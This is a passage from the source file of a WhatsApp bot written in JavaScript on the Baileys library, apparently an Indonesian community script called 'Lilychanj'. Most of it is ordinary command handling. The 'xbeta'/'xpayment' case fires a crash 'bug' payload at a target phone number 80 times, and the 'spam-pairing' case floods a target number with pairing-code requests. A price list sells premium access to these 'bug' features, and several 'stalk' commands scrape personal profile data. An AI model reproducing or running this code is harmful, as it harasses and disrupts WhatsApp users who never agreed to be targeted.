- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Total Features: ${totalFitur()} Feature
- Runtime: ${muptime}
- Type: case x plugin
`.trim();

    lilychan.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            requestFrom: '0@s.whatsapp.net',
            noteMessage: {
                extendedTextMessage: {
                    text: respon,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            showAdAttribution: true
                        }
                    }
                }
            }
        }
    }, {})
}
break

case 'runtime': {
    const used = process.memoryUsage();
    const cpus = os.cpus().map((cpu) => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });

    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0,
        },
    });

    const date = new Date();
    const jam = date.getHours();
    const menit = date.getMinutes();
    const detik = date.getSeconds();
    const ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
    const cpuuuu = os.cpus();
    const sisaram = `${Math.round(os.freemem)}`;
    const totalram = `${Math.round(os.totalmem)}`;
    const persenram = (sisaram / totalram) * 100;
    const persenramm = 100 - persenram;
    const ramused = totalram - sisaram;

    const space = await checkDiskSpace(process.cwd());
    const freespace = `${Math.round(space.free)}`;
    const totalspace = `${Math.round(space.size)}`;
    const diskused = totalspace - freespace;
    const neww = performance.now();
    const oldd = performance.now();
    let timestamp = speed();
    let latensi = speed() - timestamp;
    const { download, upload } = await checkBandwidth();

    let tanaka = `\`\`\`Runtime : ${runtime(process.uptime())} 
Respon Speed : ${latensi.toFixed(4)} ms
Date : ${lilydate}
Total Memory : ${ram}
Upload : ${upload}
Download : ${download}
Total Fitur : ${totalFitur()}
\`\`\``

    m.reply(tanaka);
}
break
case 'totalfitur': {
  const total = ((fs.readFileSync('./message.js').toString()).match(/case '/g) || []).length
	m.reply(`Total Fitur : ${total}`);
  }
break
case 'owner':
case 'creator': {
    const phoneNumber = '6281541177589'; // Nomor telepon pemilik
    const ownerContact = `wa.me/${phoneNumber}`; // Link WhatsApp pemilik
    const developerName = 'Tanaka Sensei'; // Nama pengembang
    const vCard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;${developerName}\nNICKNAME:Royal Roundtable\nORG:${developerName}\nTITLE:soft\nitem1.TEL;waid=${phoneNumber}:${phoneNumber}\nitem1.X-ABLabel:Contact Owner\nEND:VCARD`; // Format vCard

    // Mengirim pesan kontak
    const sentMsg = await lilychan.sendMessage(m.chat, {
        contacts: {
            displayName: wm, // Nama yang ditampilkan
            contacts: [{ vcard: vCard }] // Kontak yang akan dikirim
        },
        contextInfo: {
            externalAdReply: {
                title: `My Developer`, // Judul
                body: '', // Isi pesan
                thumbnailUrl: 'https://f.top4top.io/p_3220zdrfm1.jpg', // URL thumbnail
                sourceUrl: null, // URL sumber
                mediaType: 1, // Tipe media
                showAdAttribution: true, // Tampilkan atribusi iklan
                renderLargerThumbnail: true // Tampilkan thumbnail yang lebih besar
            }
        }
    }, { quoted: ftroli }); // Pesan yang dikutip
}
break;
case 'tqto': case 'thanksto':{
let imgnya = await prepareWAMessageMedia({ image: { url: "https://j.top4top.io/p_3192tiuoy1.jpg" } }, { upload: lilychan.waUploadToServer })
let imgnya2 = await prepareWAMessageMedia({ image: { url: "https://f.top4top.io/p_31923t6ft1.jpg" } }, { upload: lilychan.waUploadToServer })
let imgnya3 = await prepareWAMessageMedia({ image: { url: "https://i.top4top.io/p_3192h4d0u1.jpg" } }, { upload: lilychan.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: ""
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Thanks To:*

* *@adiwajshing/baileys*
* *@whyskeysocket/baileys*
* *WhatsApp*
* *Api - Betabotz*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By WhatsApp"
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [               
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Special Helper:*

* *Avosky*
* *Jhnspntx*
* *Papah-Chan*
* *Hann*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By WhatsApp"
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya2
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Special Helper²:*

* *Lorenzo*
* *Abay (Myrtle)*
* *Seluruh penyedia module*
* *And All Creator Bot*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By WhatsApp"
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya3
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: ftroli })
await lilychan.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case 'sc':
case 'script': {
    let lilyimg = fs.readFileSync('./AllMedia/image/thumb.jpg');
    let msg = await generateWAMessageFromContent(m.chat, {
        locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: 'KLIK DISINI',
            address: `Nyari Sc Kak? Tuh Di Atas`,
            url: 'https://github.com/TanakaDomp',
            jpegThumbnail: await resize(lilyimg,300, 300),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363285176234746@newsletter',
                    newsletterName: '© 𝕷𝖎𝖑𝖞𝖈𝖍𝖆𝖓𝖏 - 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝕭𝖔𝖙',
                    serverMessageId: 143
                }
            }
        }
    }, { quoted: m });

    lilychan.relayMessage(m.chat, msg.message, {});
}
break

case 'sewa':
case 'sewabot': {
    const p = '6281541177589';
    let owner = `wa.me/${p}`;
    let Tanaka = 'Costumer Service';
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;Tanaka Sense\nNICKNAME:Tanaka Sensei\nORG: ${Tanaka}\nTITLE:soft\nitem1.TEL;waid=${p}:${p}\nitem1.X-ABLabel:Contact Owner\nEND:VCARD`;

    let msg = `*[💰]* *[ P R I C E  S E W A B O T ]*

➠ *7 Days* : 10.000
➠ *30 Days* : 30.000
➠ *Permanent* : 60.000

🍄 Benefit Features Sewabot :

*1.* Auto Welcome
*2.* Auto Kick
*3.* Auto Open/Close
*4.* Enable Features
*5.* Autoadmin

*[🧧]* *[ P R I C E  P R E M I U M ]*

➠ *7 Days* : 5.000
➠ *30 Days* : 15.000
➠ *Permanent* : 25.000

🍄 Benefit Features Premium :

*1.* Download Xnxx
*2.* Search Tiktok
*3.* Search Asupan
*4.* Search Xnxx
*5.* Unlimited Limit
*6.* Get Acces Bug & Join

© Tanaka Store`;

    let kemek = await lilychan.sendMessage(m.chat, {
        document: {
            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
        },
        caption: msg,
        mimetype: 'application/pdf',
        fileName: `Halo ${pushname}`,
        fileLength: "99999999999",
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `RENT BOT & PREMIUM USER`,
                body: `Tanaka Store`,
                thumbnail: fs.readFileSync('./AllMedia/image/lilychanj.jpg'),
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });

    await lilychan.sendMessage(m.chat, {
        contacts: {
            displayName: wm,
            contacts: [{ vcard }]
        },
    }, { quoted: kemek });
}
break

//bug peler
case 'xbeta': 
case 'xpayment':{
if (!isPremium) return m.reply(mess.prem)
if (!q) return m.reply(`*Example*: ${prefix + command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 62872784527`)
let target = bijipler + '@s.whatsapp.net'
await m.reply('Otweh lily bug ya😍')
for (let j = 0; j < 10; j++) {
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
await BugPayment(target)
}
await m.reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'spam-pairing':{
if (!isPremium) return m.reply(mess.prem)
	let { state } = await useMultiFileAuthState("tmp");
	//TanakaSense
	let config = {
		printQRInTerminal: false,
		browser: ["Ubuntu", "Chrome", "20.0.04"],
		auth: state
	};
	
	global.LilychanjByTanakaSenseSockets = makeWASocket(config)
	//TanakaSense
	let [num, jum, slep] = text.split(' ')
	let jumlah = jum ? jum : 1
	let jeda = slep ? slep : 2000
	//Tanaka Sense
	if (!num) return m.reply(`*Enter The Number Target!*\nExample Code: .spampairing nomor jumlah jeda\nExample: .spampairing 628xxx 10 1000\n\n*[ N O T E ]*\nUntuk jeda, *1000* = 1 detik`)
	if (jeda < 1000) return m.reply("Waktu jeda minimal 1000!")
	if (num.includes('6281541177589')) return m.reply("Jangan Spam Ke Ownerku!!!")
	//TanakaSense
	try {
		await m.reply("_Sending Request..._")
		await sleep(jeda) // Untuk mencegah Emrror
		let phoneNumber = num.replace(/[^0-9]/g, '');
		if (!Object.keys(PHONENUMBER_MCC)?.some(v => phoneNumber?.startsWith(v))) {
			phoneNumber = num.replace(/[^0-9]/g, '');
		};
		for (let i = 0; i < jumlah; i++) { 
			await LilychanjByTanakaSenseSockets?.requestPairingCode(phoneNumber)
			await sleep(jeda)
		};
		await m.reply(`*Spam Succsess...*\n\n*• Target:* ${phoneNumber}\n*• Jumlah:* ${jum}\n*• Jeda:* ${slep} ms`)//TanakaSense
	} catch(x) {
		m.reply(String(x))
	}//TanakaSense
}
break
case 'stalkml': {
    async function stalkml(id, zoneId) {
        return new Promise(async (resolve, reject) => {
            axios.post(
                'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
                new URLSearchParams({
                    productId: '1',
                    itemId: '2',
                    catalogId: '57',
                    paymentId: '352',
                    gameId: id,
                    zoneId: zoneId,
                    product_ref: 'REG',
                    product_ref_denom: 'AE',
                }),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        Referer: 'https://www.duniagames.co.id/',
                        Accept: 'application/json',
                    },
                }
            ).then((response) => {
                resolve({
                    status: 200,
                    id: id,
                    zoneId: zoneId,
                    nickname: response.data.data.gameDetail.userName
                });
            }).catch((err) => {
                resolve({
                    status: 404,
                    msg: 'User  Id or ZoneId Not Found'
                });
            });
        });
    }

    if (!text) return m.reply('Masukan ID Dan Zone\n\nExample .stalkml 705061597 8822');
    m.reply(mess.wait);
    const idnya = text.split(" ")[0];
    const zoneid = text.split(" ")[1];
    let data = await stalkml(idnya, zoneid);
    let cap = `Name : ${data.nickname}\nID : ${data.id}\nZoneID : ${data.zoneId}`;
    m.reply(cap);
}
break

case 'urlebird': {
    if (!q) return m.reply(`contoh urlebird: jokowi`);
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function kyzh(query, m) {
        try {
            const { data } = await axios.get(`https://urlebird.com/id/search/?q=${encodeURIComponent(query)}`);
            const $ = cheerio.load(data);
            const users = [];

            $('.user').each((index, element) => {
                const profileUrl = $(element).find('.info .uri').attr('href');
                const username = $(element).find('.info .uri').text().trim();
                const displayName = $(element).find('.info span').first().text().trim();
                const followers = $(element).find('.info .followers').text().trim();
                const imgElement = $(element).find('.img img');
                const imgUrl = imgElement.data('src') || imgElement.attr('src');

                users.push({
                    profileUrl: profileUrl,
                    username: username,
                    displayName: displayName,
                    followers: followers,
                    imgUrl: imgUrl
                });
            });

            let result = `Hasil pencarian untuk "${query}":\n\n`;
            users.forEach((user, index) => {
                result += `${index + 1}. Username: ${user.username}\n`;
                result += `   Nama Tampilan: ${user.displayName}\n`;
                result += `   Pengikut: ${user.followers}\n`;            
                result += `   URL Profil: ${user.profileUrl}\n`;
                result += `   Gambar: ${user.imgUrl}\n\n`;
            });

            m.reply(result);
        } catch (error) {
            m.reply('Terjadi kesalahan saat mengambil data.');
        }
    }

    kyzh(`${encodeURIComponent(text)}`, m);
}
break

case 'igstalk': {
    if (!text) return m.reply('```Masukan Username```');
    let api = await fetch(`https://api.betabotz.eu.org/api/stalk/ig?username=${text}&apikey=${btz}`);
    m.reply(mess.wait);
    let lilycwan = await api.json();
    
    const {
        username,
        fullName,
        bio,
        followers,
        following,
        postsCount,
        photoUrl
    } = lilycwan.result;

    let captions = `*[ INSTAGRAM STALK ]*\n
Nama : ${username}
Nama² : ${fullName}
Pengikut : ${followers}
Mengikuti : ${following}
Postingan : ${postsCount}
Bio : ${bio}
`;

    const instagram = await new canvafy.Instagram()
        .setTheme("dark")
        .setUser ({ username: `${username}` })
        .setLike({ count: 125004, likeText: "like" })
        .setVerified(true)
        .setStory(true)
        .setPostDate(Date.now() - 1000 * 60 * 60 * 24 * 2)
        .setAvatar(`${photoUrl}`)
        .setPostImage(`${photoUrl}`)
        .setLiked(true)
        .setSaved(true)
        .build();

    let TanakaGanteng = instagram;
    lilychan.sendMessage(m.chat, { image: TanakaGanteng, caption: captions },{ quoted : m });     
}
break

case 'ttstalk': {
    async function tiktokStalk(user) {
        let res = await axios.get(`https://urlebird.com/user/${user}/`);
        let $ = cheerio.load(res.data), obj = {};

        obj.pp_user = $('div[class="col-md-auto justify-content-center text-center"] > img').attr('src');
        obj.name = $('h1.user').text().trim();
        obj.username = $('div.content > h5').text().trim();
        obj.followers = $('div[class="col-7 col-md-auto text-truncate"]').text().trim().split(' ')[1];
        obj.following = $('div[class="col-auto d-none d-sm-block text-truncate"]').text().trim().split(' ')[1];
        obj.description = $('div.content > p').text().trim();

        return obj;
    }

    try {
        if (!text) return m.reply('```Masukan Username```');
        let data = await tiktokStalk(`${text}`);
        m.reply(mess.wait);
        let captions = `*[ TIKTOK STALK ]*\n
Username : ${data.username}
Name : ${data.name}
Followers : ${data.followers}
Following : ${data.following}
Bio : ${data.description}
`;

        lilychan.sendMessage(m.chat, { image: { url : data.pp_user }, caption: captions },{ quoted : m });     
    } catch (e) {
        m.reply('User Tidak Ditemukan');
    }
}
break
case 'githubstalk':{
async function githubstalk(user) {
    return new Promise((resolve, reject) => {
        axios.get('https://api.github.com/users/'+user)
        .then(({ data }) => {
            let hasil = {
                username: data.login,
                nickname: data.name,
                bio: data.bio,
                id: data.id,
                nodeId: data.node_id,
                profile_pic: data.avatar_url,
                url: data.html_url,
                type: data.type,
                admin: data.site_admin,
                company: data.company,
                blog: data.blog,
                location: data.location,
                email: data.email,
                public_repo: data.public_repos,
                public_gists: data.public_gists,
                followers: data.followers,
                following: data.following,
                ceated_at: data.created_at,
                updated_at: data.updated_at
            }
            resolve(hasil)
        })
    })
}
if (!text) return m.reply('```Masukan Username```')
let data = await githubstalk(`${text}`)
m.reply(mess.wait)
let captions = `*[ GITHUB STALK ]*\n
Username : ${data.username}
Nickname : ${data.nickname}
Followers : ${data.followers}
Following : ${data.following}
Bio : ${data.bio}
Url : ${data.url}
ID : ${data.id}
NodeID : ${data.nodeId}
Type : ${data.type}
Admin : ${data.admin}
Company : ${data.company}
Blog : ${data.blog}
Location : ${data.location}
Email : ${data.email}
Repo Public : ${data.public_repo}
Create at : ${data.ceated_at}
Update at : ${data.updated_at}
`
lilychan.sendMessage(m.chat, { image: { url : data.profile_pic }, caption: captions },{ quoted : m })     
}
break
case 'inspect':
case 'ci': {
    if (!text) return m.reply(`Kirim perintah ${prefix + command} https://whatsapp.com/channel/xxxxxxxx`);
    if (!args[0] || !args[0].includes('whatsapp.com/channel')) return m.reply("link tidak valid");

    await lilychan.sendMessage(m.chat, {
        react: {
            text: "⏱️",
            key: m.key,
        }
    });

    function formatDate(timestamp) {
        const date = new Date(timestamp * 1000);
        const months = [
            'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
            'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
        ];
        const day = date.getDate();
        const month = months[date.getMonth()];
        const year = date.getFullYear();
        return `${day} ${month} ${year}`;
    }

    try {
        let result = args[0].split('https://whatsapp.com/channel/')[1];
        let data = await lilychan.newsletterMetadata("invite", result);
        let teks = `*NEWSLETTER ID*

*Name:* ${data.name}
*ID*: ${data.id}
*Status*: ${data.state}
*Dibuat Pada*: ${formatDate(data.creation_time)}
*Subscribers*: ${data.subscribers}
*Meta Verify*: ${data.verification}
*React Emoji:* ${data.reaction_codes}
*Description*: ${readmore}
${data.description}
`;

        let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: ''
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: ``,
                            subtitle: "",
                            hasMediaAttachment: false
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_copy",
                                    "buttonParamsJson": `{"display_text":"Copy ID","id":"123456789","copy_code":"${data.id}"}`
                                },
                            ]
                        })
                    })
                }
            }
        }, { quoted: m });

        await lilychan.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {
        m.reply("link tidak valid");
    }
}
break
case'q': case 'qreply': {
if (!m.quoted) return m.reply('Reply Pesannya!!')
let lily = await lilychan.serializeM(await m.getQuotedObj())
if (!lily.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await lily.quoted.copyNForward(m.chat, true)
}
break      
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < BATAS AKHIR >

*/
//<================================================>//
case 'lily': {
    if (!text) {
        return reply(`Hallo *${pushname}* Aku Lilychanj Senang bertemu denganmu~ Apa yang ingin kamu ceritakan atau tanyakan hari ini? Aku siap mendengarkan dan membantu dengan apapun yang kamu butuhkan! 😅`.trim());
    }

    if (text.includes("tutup") && text.includes("group")) {
        if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        await lilychan.groupSettingUpdate(m.chat, "announcement");
        m.reply(`Oke, grup telah ditutup. Semoga lebih teratur ya~ 😉`);
    } else if (text.includes("buka") && text.includes("group")) {
        if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        await lilychan.groupSettingUpdate(m.chat, "not_announcement");
        m.reply(`Oke, grup telah dibuka. Ayo kita beraktivitas bersama-sama! 😉`);
    } else if (text.includes("cariin") || text.includes("cari")) {
        await m.reply('Bentar ya lily cariin..');
        let { pinterest } = require('./lib/scraper');
        let anutrest = await pinterest(text);
        let result = anutrest[Math.floor(Math.random() * anutrest.length)];
        lilychan.sendMessage(m.chat, { image: { url: result }, caption: 'Ni lily udh ketemu fotonya..😖' }, { quoted: m });
    } else if (text.includes("carikan") || text.includes("putar") || text.includes("putarkan") || text.includes("play")) {
        m.reply("Okey lily carii lagunya dulu ya..");
        let search = await yts(text);
        let videos = search.all.filter(v => v.type === 'video');
        if (!videos.length) {
            await m.reply('No videos found for your query.', { quoted: m });
            return;
        }
        let video = videos[0];
        let api = await fetch(`https://api.betabotz.eu.org/api/download/ytmp4?url=${video.url}&apikey=${btz}`);
        let lilycwan = await api.json();
        const { mp3 } = lilycwan.result;
        lilychan.sendMessage(m.chat, {
            audio: {
                url: mp3
            },
            mimetype: "audio/mpeg",
            ptt: false
        }, { quoted: m });
    } else if (text.includes("tiktok.com") || text.includes("vt.tiktok.com")) {
        m.reply('Okeyy Sabar Yah');
        let { tiktok2 } = require("./lib/tiktokdl");
        let tanaka = await tiktok2(`${text}`);
        await lilychan.sendMessage(m.chat, { video: { url: tanaka.no_watermark }, caption: 'nih video nya✨' }, { quoted: m });
    } else if (text.includes("kick") || text.includes("kik")) {
        if (!isBotAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        if (!isAdmins) return m.reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await lilychan.groupParticipantsUpdate(m.chat, [users], "remove");
        m.reply(`Maaf Ya Terpaksa Aku Tendang 😖, Perintah Admin Sih..`);
    } else {
        let logic = 'sekarang peran kamu adalah seseorang bernama Lily kamu adalah seseorang yang sangat amat ramah dan baik hati dan saat berinteraksi kamu harus selalu memanggil lawan bicara mu dengan kata "senpai" dan kamu juga wajib menjawab pertanyaan dengan nada kalem sopan keren humoris suma bercanda cool mantap lalu sertakan kaomoji kaomoji ascii';
        await lilychan.sendMessage(m.chat, { react: { text: "💬", key: m.key } });
        let aii = await fetchJson(`https://api.betabotz.eu.org/api/search/openai-logic?text=${text}&logic=${logic}&apikey=${btz}`);
        reply(aii.message);
    }
}
break;

case 'simih': {
    if (!isCreator) return m.reply('nah nah ngapain');
    if (!q) return m.reply(`Pilih on atau off`);
    if (args[0] === "on") {
        if (SimiActive) return m.reply('Already activated');
        simion.push(from);
        fs.writeFileSync('./database/simion.json', JSON.stringify(simion));
        m.reply('Success in turning on Simi in this group');
        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];
        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });
        lilychan.sendMessage(m.chat, { text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nSimi Online!`, contextInfo: { mentionedJid: mems } }, { quoted: m });
    } else if (args[0] === "off") {
        if (!SimiActive) return m.reply('Already deactivated');
        let off = simion.indexOf(from);
        simion.splice(off, 1);
        fs.writeFileSync('./database/simion.json', JSON.stringify(simion));
        m.reply('Success in turning off Simi in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break;
////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////////////))/////////////////////////////////////////////////////////////////////////////////////)///////////////////////////////////////
default:

//<================================================>
if ((budy.match) && ["sepuh", "Sepuh", "Sepuhh", "sepuhh"].includes(budy)) {
    let msg = await generateWAMessageContent({
            video: { url: 'https://telegra.ph/file/2ff6d0005fc4a32f67f65.mp4' }
        }, {
            upload: lilychan.waUploadToServer
        })
        let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m })
       await lilychan.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
}
//<================================================>
if (budy.startsWith('$')) {
    if (!isCreator) return m.reply(mess.owner);
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(err);
        if (stdout) return m.reply(stdout);
    });
}

if (budy.startsWith('>')) {
    if (!isCreator) return m.reply(mess.owner);
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        await m.reply(String(err));
    }
}

//<================================================>                
if (budy.startsWith('=>')) {
    if (!isCreator) return m.reply(mess.owner);

    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return m.reply(bang);
    }

    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
    } catch (e) {
        m.reply(String(e));
    }
}

if ((m.mtype === 'groupInviteMessage' || 
     m.text.startsWith('Undangan untuk bergabung') || 
     m.text.startsWith('Invitation to join') || 
     m.text.startsWith('Buka tautan ini')) && 
     !m.isBaileys && 
     !m.isGroup) {
    await lilychan.sendMessage(m.chat, {
        react: {
            text: `🤨`,
            key: m.key,
        }
    });
}
//batas euy 
}
} catch (err) {
    let formattedError = util.format(err);   
    let errorMessage = String(formattedError);   
    let stackTrace = err.stack ? err.stack : "Stack trace not available";
    if (typeof err === 'string') {
        m.reply(`Terjadi error:\n\nKeterangan Error: ${errorMessage}`);
    } else {
        console.log(formattedError);
        lilychan.sendMessage("6283841951316@s.whatsapp.net", {
            text: `Alo ketua, ada error nih:\n\nKeterangan Error: ${errorMessage}\n\nStack Trace:\n${stackTrace}`,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        });
    }
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
